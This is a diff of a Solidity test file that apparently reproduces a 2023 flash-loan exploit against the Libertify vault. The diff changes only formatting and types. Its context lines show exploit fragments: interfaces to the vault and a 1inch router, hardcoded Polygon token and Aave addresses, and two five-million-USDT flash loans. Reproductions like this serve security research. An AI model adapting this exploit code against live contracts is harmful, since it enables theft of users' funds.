+++ src/test/2023-07/Libertify_exp.sol
@@ -20,16 +20,21 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 interface ILibertiVault {
+
     function deposit(uint256 assets, address receiver, bytes calldata data) external returns (uint256 shares);
     function exit() external returns (uint256 amountToken0, uint256 amountToken1);
+
 }
 
 interface IAggregationExecutor {
+
     /// @notice Make calls on `msgSender` with specified data
     function callBytes(address msgSender, bytes calldata data) external payable; // 0x2636f7f8
+
 }
 
 interface oneInchV4Router {
+
     struct SwapDescription {
         IERC20 srcToken;
         IERC20 dstToken;
@@ -46,9 +51,11 @@ interface oneInchV4Router {
         SwapDescription calldata desc,
         bytes calldata data
     ) external payable returns (uint256 returnAmount, uint256 spentAmount, uint256 gasLeft);
+
 }
 
 contract ContractTest is Test {
+
     IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
     IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);
     IAaveFlashloan aaveV2 = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
@@ -72,7 +79,7 @@ contract ContractTest is Test {
         assets[0] = address(USDT);
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = 5_000_000 * 1e6;
-        uint256[] memory modes = new uint[](1);
+        uint256[] memory modes = new uint256[](1);
         modes[0] = 0;
         aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
         aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
@@ -147,4 +154,5 @@ contract ContractTest is Test {
         });
         Router.exactOutputSingle(_Param);
     }
+
 }
